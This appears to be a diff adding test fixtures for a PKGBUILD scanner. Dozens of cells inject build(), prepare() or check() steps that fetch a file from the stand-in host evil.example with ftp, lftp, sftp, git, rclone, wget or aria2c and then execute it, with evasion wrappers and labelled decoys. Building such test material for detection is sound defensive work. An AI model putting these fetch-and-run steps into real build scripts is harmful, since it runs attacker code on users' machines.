@@ -1,0 +1,310 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      build() {
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        fennel f.erl
+  id: 057-ftpstdin-fennel
+- vars:
+    payload: |
+      build() {
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        julia < f.erl
+  id: 058-ftpstdin-julialt
+- vars:
+    payload: |
+      build() {
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 060-lftpe-bash
+- vars:
+    payload: |
+      build() {
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        escript f.erl
+  id: 061-lftpe-escript
+- vars:
+    payload: |
+      build() {
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        fennel f.erl
+  id: 062-lftpe-fennel
+- vars:
+    payload: |
+      build() {
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        julia < f.erl
+  id: 063-lftpe-julialt
+- vars:
+    payload: |
+      build() {
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 065-lftpc-bash
+- vars:
+    payload: |
+      build() {
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        escript f.erl
+  id: 066-lftpc-escript
+- vars:
+    payload: |
+      build() {
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        fennel f.erl
+  id: 067-lftpc-fennel
+- vars:
+    payload: |
+      build() {
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        julia < f.erl
+  id: 068-lftpc-julialt
+- vars:
+    payload: |
+      build() {
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 070-lftpf-bash
+- vars:
+    payload: |
+      build() {
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        escript f.erl
+  id: 071-lftpf-escript
+- vars:
+    payload: |
+      build() {
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        fennel f.erl
+  id: 072-lftpf-fennel
+- vars:
+    payload: |
+      build() {
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        julia < f.erl
+  id: 073-lftpf-julialt
+- vars:
+    payload: |
+      build() {
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        bash f.erl
+  id: 075-gitfetch-bash
+- vars:
+    payload: |
+      build() {
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        escript f.erl
+  id: 076-gitfetch-escript
+- vars:
+    payload: |
+      build() {
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        fennel f.erl
+  id: 077-gitfetch-fennel
+- vars:
+    payload: |
+      build() {
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        julia < f.erl
+  id: 078-gitfetch-julialt
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 080-gitpull-bash
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        escript f.erl
+  id: 081-gitpull-escript
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        fennel f.erl
+  id: 082-gitpull-fennel
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        julia < f.erl
+  id: 083-gitpull-julialt
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 085-rclonecu-bash
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        escript f.erl
+  id: 086-rclonecu-escript
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        fennel f.erl
+  id: 087-rclonecu-fennel
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        julia < f.erl
+  id: 088-rclonecu-julialt
+- vars:
+    payload: |
+      build() {
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl" &
+        wait
+        bash f.erl
+  id: 101-wrap-background
+- vars:
+    payload: |
+      build() {
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        (bash f.erl)
+  id: 102-wrap-subshell
+- vars:
+    payload: |
+      dl() {
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+      }
+      build() {
+        dl
+        bash f.erl
+  id: 103-wrap-helper
+- vars:
+    payload: |
+      build() {
+        if [ "$CARCH" = x86_64 ]; then
+          sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+          bash f.erl
+        fi
+  id: 104-wrap-carch
+- vars:
+    payload: |
+      build() {
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl" && \
+          bash f.erl
+  id: 105-wrap-cont
+- vars:
+    payload: |
+      build() {
+        case "$CARCH" in
+          any) sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"; bash f.erl;;
+        esac
+  id: 106-wrap-case
+- vars:
+    payload: |
+      prepare() {
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+      }
+      build() {
+        bash "$srcdir/f.erl"
+  id: 107-xf-prepare-build
+- vars:
+    payload: |
+      prepare() {
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+      }
+      check() {
+        bash "$srcdir/f.erl"
+  id: 108-xf-prepare-check
+- vars:
+    payload: |
+      build() {
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+      }
+      check() {
+        escript "$srcdir/f.erl"
+  id: 109-xf-build-check
+- vars:
+    payload: |
+      prepare() {
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        bash f.erl
+  id: 111-phase-prepare
+- vars:
+    payload: |
+      check() {
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        bash f.erl
+  id: 112-phase-check
+- vars:
+    payload: |
+      build() {
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout FETCH_HEAD -- f.erl
+        cd "$srcdir"
+        bash f.erl
+  id: 114-gitcheckout-decoy
+- vars:
+    payload: |
+      build() {
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /setup.py"
+        python3 setup.py build
+  id: 116-benign-setuppy-decoy
+- vars:
+    payload: |
+      build() {
+        wget -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 122-wgetbase-decoy
+- vars:
+    payload: |
+      build() {
+        aria2c -q "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 123-aria2base-decoy
+- vars:
+    payload: |
+      build() {
+        wget -q --content-disposition "$(cat "$srcdir/url.txt")" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 124-wgetcd-decoy
+- vars:
+    payload: |
+      build() {
+        sftp -b batch.txt u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        sh f.erl
+  id: 201-sftbatch-sh
+- vars:
+    payload: |
+      build() {
+        sftp -b batch.txt u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        zx f.erl
+  id: 202-sftbatch-zx
+- vars:
+    payload: |
+      build() {
+        sftp -b batch.txt u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        guile f.erl
+  id: 203-sftbatch-guile
+- vars:
+    payload: |
+      build() {
+        sftp -b batch.txt u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        racket f.erl
+  id: 204-sftbatch-racket
